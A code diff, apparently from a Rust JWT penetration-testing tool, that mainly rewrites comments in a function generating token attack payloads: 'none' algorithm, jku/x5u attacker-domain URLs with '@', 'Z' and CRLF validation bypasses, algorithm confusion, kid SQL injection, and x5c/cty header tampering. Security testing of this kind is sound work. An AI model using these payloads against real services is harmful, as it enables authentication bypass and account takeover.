@@ -8,7 +8,7 @@ use std::collections::HashSet;
 use crate::jwt;
 use crate::utils;
 
-/// Execute the payload command
+/// Generates different JWT attack payloads based on the given token and parameters
 pub fn execute(
     token: &str,
     jwk_trust: Option<&str>,
@@ -33,11 +33,11 @@ fn generate_payloads(
     jwk_protocol: &str,
     target: Option<&str>,
 ) -> Result<()> {
-    // Decode the JWT token to get claims
+    // Decode JWT token and extract claims
     let decoded = jwt::decode(token)?;
     let _claims_json = serde_json::to_string(&decoded.claims)?;
 
-    // Split token to get the claims part
+    // Extract claims part from token
     let token_parts: Vec<&str> = token.split('.').collect();
     if token_parts.len() < 2 {
         return Err(anyhow::anyhow!("Invalid JWT token format"));
@@ -45,13 +45,13 @@ fn generate_payloads(
 
     let claims_part = token_parts[1];
 
-    // Parse target parameter
+    // Parse comma-separated target types into a HashSet
     let targets: HashSet<String> = match target {
         Some(t) => t.split(',').map(|s| s.trim().to_lowercase()).collect(),
         None => HashSet::from(["all".to_string()]),
     };
 
-    // Available target types
+    // Define list of supported attack target types
     let valid_targets = [
         "all",
         "none",
@@ -74,7 +74,7 @@ fn generate_payloads(
 
     let should_generate_all = targets.contains("all");
 
-    // Generate none algorithm payloads if requested
+    // Generate 'none' algorithm attack payloads
     if should_generate_all || targets.contains("none") {
         utils::log_info("Generating 'none' algorithm attack payloads");
         let spinner = utils::start_progress("Creating none algorithm variants...");
@@ -86,7 +86,7 @@ fn generate_payloads(
         spinner.finish_and_clear();
     }
 
-    // Generate URL payloads if attack domain is provided and if requested
+    // Generate URL-based attack payloads (jku/x5u) if attack domain is provided
     if let Some(attack_domain) = jwk_attack {
         if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
             utils::log_info(format!(
@@ -111,7 +111,7 @@ fn generate_payloads(
         utils::log_info("To generate URL payloads, use --jwk-attack parameter.");
     }
 
-    // Generate algorithm confusion payloads if requested
+    // Generate algorithm confusion attack payloads (RS256->HS256)
     if should_generate_all || targets.contains("alg_confusion") {
         utils::log_info("Generating algorithm confusion attack payloads");
         let spinner = utils::start_progress("Creating algorithm confusion variants...");
@@ -132,7 +132,7 @@ fn generate_payloads(
         spinner.finish_and_clear();
     }
 
-    // Generate kid SQL injection payloads if requested
+    // Generate key ID (kid) SQL injection attack payloads
     if should_generate_all || targets.contains("kid_sql") {
         utils::log_info("Generating kid SQL injection attack payloads");
         let spinner = utils::start_progress("Creating kid SQL injection variants...");
@@ -151,7 +151,7 @@ fn generate_payloads(
         spinner.finish_and_clear();
     }
 
-    // Generate x5c header injection payloads if requested
+    // Generate x5c certificate header injection attack payloads
     if should_generate_all || targets.contains("x5c") {
         utils::log_info("Generating x5c header injection attack payloads");
         let spinner = utils::start_progress("Creating x5c header injection variants...");
@@ -170,7 +170,7 @@ fn generate_payloads(
         spinner.finish_and_clear();
     }
 
-    // Generate cty header manipulation payloads if requested
+    // Generate content type (cty) header manipulation attack payloads
     if should_generate_all || targets.contains("cty") {
         utils::log_info("Generating cty header manipulation attack payloads");
         let spinner = utils::start_progress("Creating cty header variants...");
@@ -194,8 +194,9 @@ fn generate_payloads(
     Ok(())
 }
 
+/// Creates JWT payloads using 'none' algorithm attack variants with specified claims
 fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
-    // Create header with none algorithm
+    // Create header with 'none' algorithm variant
     let header = json!({
         "alg": alg_value,
         "typ": "JWT"
@@ -207,10 +208,10 @@ fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
         alg_value, header_json, alg_value
     );
 
-    // Encode header to base64
+    // Base64 encode the header for JWT format
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
 
-    // Format as JWT (without signature)
+    // Format as JWT token without signature (none algorithm attack)
     println!(
         "\n{}",
         format!("━━━ None Algorithm Payload ({}) ━━━", alg_value)
@@ -227,6 +228,7 @@ fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
     Ok(())
 }
 
+/// Creates various URL-based attack payloads using JKU/X5U header parameters
 fn generate_url_payloads(
     claims: &str,
     jwk_trust: Option<&str>,
@@ -250,7 +252,7 @@ fn generate_url_payloads(
     }
 
     for (key_type, domain) in jku_payloads {
-        // Basic payload
+        // Generate basic URL payload with attack domain
         let header = json!({
             "alg": "hs256",
             key_type: domain,
@@ -277,9 +279,9 @@ fn generate_url_payloads(
         );
         println!();
 
-        // If trust domain is provided, generate bypass payloads
+        // If trust domain is provided, generate URL validation bypass payloads
         if let Some(trust_domain) = jwk_trust {
-            // Bypass host validation - Z separator
+            // Generate Z-separator URL validation bypass payload
             let bypass_z_url = format!("{}://{}{}{}", jwk_protocol, trust_domain, "Z", jwk_attack);
             let header = json!({
                 "alg": "hs256",
@@ -307,7 +309,7 @@ fn generate_url_payloads(
             );
             println!();
 
-            // Bypass host validation - @ separator
+            // Generate @-separator URL validation bypass payload
             let bypass_at_url = format!("{}://{}@{}", jwk_protocol, trust_domain, jwk_attack);
             let header = json!({
                 "alg": "hs256",
@@ -335,7 +337,7 @@ fn generate_url_payloads(
             );
             println!();
 
-            // Host header injection with CRLF
+            // Generate CRLF-based Host header injection payload
             let crlf_url = format!(
                 "{}://{}%0d0aHost: {}",
                 jwk_protocol, trust_domain, jwk_attack
